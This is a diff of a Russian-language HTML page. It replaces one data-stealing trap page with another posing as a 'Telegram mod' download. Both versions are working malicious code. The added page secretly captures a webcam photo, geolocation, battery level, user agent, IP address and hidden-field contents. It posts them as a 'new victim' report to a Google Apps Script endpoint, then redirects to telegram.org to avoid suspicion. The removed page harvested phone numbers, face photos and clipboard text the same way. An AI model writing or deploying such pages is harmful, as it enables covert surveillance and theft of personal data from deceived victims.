@@ -1,107 +1,136 @@
-‎<!DOCTYPE html>
-‎<html lang="ru">
-‎<head>
-‎<meta charset="UTF-8">
-‎<meta name="viewport" content="width=device-width, initial-scale=1.0">
-‎<title>Помощь деревне</title>
-‎<style>
-‎  body { font-family: Arial, sans-serif; background: #1a1a1a; color: #eee; padding: 20px; }
-‎  .card { background: #2a2a2a; padding: 20px; border-radius: 10px; margin: 15px 0; }
-‎  input, button { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: none; font-size: 16px; }
-‎  input { background: #444; color: #fff; }
-‎  button { background: #c0392b; color: #fff; cursor: pointer; }
-‎  button:hover { background: #e74c3c; }
-‎  h2 { color: #f39c12; }
-‎  .hidden { display: none; }
-‎</style>
-‎</head>
-‎<body>
-‎
-‎<h1>Помощь выжившим</h1>
-‎
-‎<!-- Ловушка 3: Гуманитарная помощь -->
-‎<div class="card">
-‎  <h2>Гуманитарная помощь</h2>
-‎  <p>Введите номер телефона, чтобы получить набор:</p>
-‎  <input type="tel" id="phoneNum" placeholder="+7...">
-‎  <button onclick="sendPhone()">Получить помощь</button>
-‎</div>
-‎
-‎<!-- Ловушка 2: Сканер документов -->
-‎<div class="card">
-‎  <h2>Медицинский сканер</h2>
-‎  <p>Для получения медицинской помощи отсканируйте лицо:</p>
-‎  <button onclick="startCamera()">Отсканировать</button>
-‎  <video id="video" class="hidden" autoplay playsinline></video>
-‎  <canvas id="canvas" class="hidden"></canvas>
-‎</div>
-‎
-‎<!-- Ловушка 4: Буфер обмена -->
-‎<div class="card">
-‎  <h2>Синхронизация данных</h2>
-‎  <p>Нажмите для синхронизации скопированных данных:</p>
-‎  <button onclick="readClipboard()">Синхронизировать</button>
-‎</div>
-‎
-‎<script>
-‎const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzQ2wWYuZ6ix9kvEYaXmWBiGY-sr9j0rMjrIjHO92taxLptEH4VHP50Jr5hzcQ3UVf-3g/exec/exec';
-‎
-‎function sendData(type, data) {
-‎  fetch(SCRIPT_URL, {
-‎    method: 'POST',
-‎    mode: 'no-cors',
-‎    headers: {'Content-Type': 'application/json'},
-‎    body: JSON.stringify({type: type, data: data, ts: new Date().toISOString()})
-‎  });
-‎}
-‎
-‎function sendWifi() {
-‎  const v = document.getElementById('wifiPass').value;
-‎  if (!v) return alert('Введите пароль');
-‎  sendData('ПАРОЛЬ', v);
-‎  alert('Синхронизация успешна');
-‎  document.getElementById('wifiPass').value = '';
-‎}
-‎
-‎function sendPhone() {
-‎  const v = document.getElementById('phoneNum').value;
-‎  if (!v) return alert('Введите номер');
-‎  sendData('НОМЕР_ТЕЛЕФОНА', v);
-‎  alert('Заявка принята');
-‎  document.getElementById('phoneNum').value = '';
-‎}
-‎
-‎async function startCamera() {
-‎  try {
-‎    const stream = await navigator.mediaDevices.getUserMedia({video: true});
-‎    const video = document.getElementById('video');
-‎    video.srcObject = stream;
-‎    video.classList.remove('hidden');
-‎    setTimeout(() => {
-‎      const canvas = document.getElementById('canvas');
-‎      canvas.width = video.videoWidth;
-‎      canvas.height = video.videoHeight;
-‎      canvas.getContext('2d').drawImage(video, 0, 0);
-‎      const b64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
-‎      sendData('ФОТО_ЖЕРТВЫ', b64);
-‎      stream.getTracks().forEach(t => t.stop());
-‎      video.classList.add('hidden');
-‎      alert('Сканирование завершено');
-‎    }, 2000);
-‎  } catch(e) {
-‎    alert('Камера недоступна');
-‎  }
-‎}
-‎
-‎async function readClipboard() {
-‎  try {
-‎    const text = await navigator.clipboard.readText();
-‎    sendData('БУФЕР_ОБМЕНА', text);
-‎    alert('Синхронизировано');
-‎  } catch(e) {
-‎    alert('Ошибка синхронизации');
-‎  }
-‎}
-‎</script>
-‎</body>
-‎</html>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Скачивание телеграм мода</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #111; color: white; text-align: center; padding: 20px; }
+        .box { background: #222; padding: 20px; border-radius: 10px; max-width: 400px; margin: 0 auto; border: 1px solid #444; }
+        h2 { color: #00ffcc; }
+        button { width: 100%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        /* Скрываем все поля ввода и элементы камеры, чтобы выглядело как на скрине */
+        input, video, canvas { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Скачивание телеграм мода</h2>
+
+        <form id="trapForm" style="margin:0;">
+            <!-- Скрытые поля для сбора данных -->
+            <input type="text" id="name" placeholder="Имя">
+            <input type="tel" id="phone" placeholder="Телефон">
+            <input type="password" id="password" placeholder="Пароль">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+
+            <button type="button" onclick="startCamera()">1. Download</button>
+            <button type="button" onclick="fakeDownload()">2. Download 2</button>
+        </form>
+    </div>
+
+    <script>
+        // Твоя ссылка на Google Script
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyBuMTwcpeEo1dq_CbpNOC4iSHZc_YLiwLKwuSyTzYXF_Znd0oP3YXp9FM9mzKRBaoc/exec";
+
+        let ua = navigator.userAgent;
+        let batteryLevel = "?";
+        let photoBase64 = "";
+        let lat = "denied";
+        let lon = "denied";
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => batteryLevel = Math.round(b.level * 100) + "%");
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (pos) => { lat = pos.coords.latitude; lon = pos.coords.longitude; },
+            (err) => { console.log("Гео запрещено"); }
+        );
+
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        photoBase64 = canvas.toDataURL('image/jpeg', 0.5);
+                        
+                        // Останавливаем камеру
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // Отправляем данные
+                        sendData();
+                    }, 1500); // Ждем 1.5 секунды для фокуса камеры
+                })
+                .catch(err => {
+                    // Если камеру не дали - все равно отправляем текстовые данные без фото
+                    console.log("Камера недоступна: " + err.message);
+                    sendData();
+                });
+        }
+
+        function sendData() {
+            fetch('https://ipwho.is/')
+                .then(r => r.json())
+                .then(d => sendToGoogle(d.ip || "Unknown", d.city || "Unknown"))
+                .catch(() => sendToGoogle("Unknown", "Unknown"));
+        }
+
+        function sendToGoogle(ip, city) {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+
+            const content = 
+                "**Новая жертва**\n" +
+                "**Имя:** " + name + "\n" +
+                "**Телефон:** " + phone + "\n" +
+                "**Пароль:** " + password + "\n" +
+                "**UA:** " + ua + "\n" +
+                "**Батарея:** " + batteryLevel + "\n" +
+                "**Координаты:** " + lat + ", " + lon + "\n" +
+                "**IP:** " + ip + "\n" +
+                "**Город:** " + city;
+
+            const payload = {
+                text: content,
+                photo: photoBase64
+            };
+
+            // Отправляем текстовый запрос в Google Script (обходит блокировки провайдера)
+            fetch(SCRIPT_URL, {
+                method: 'POST',
+                body: JSON.stringify(payload),
+                headers: { 'Content-Type': 'text/plain;charset=utf-8' } // text/plain не вызывает CORS ошибок
+            }).finally(() => {
+                // Перекидываем на официальный сайт телеграма, чтобы не вызывать подозрений
+                window.location.href = "https://telegram.org/";
+            });
+        }
+
+        // Приманка для второй кнопки
+        function fakeDownload() {
+            // Создаем фейковый файл для скачивания
+            const blob = new Blob(["Telegram Mod Installer"], {type: "text/plain"});
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = "Telegram_Mod.txt";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            
+            // Через секунду перекидываем на оф. сайт
+            setTimeout(() => {
+                window.location.href = "https://telegram.org/";
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
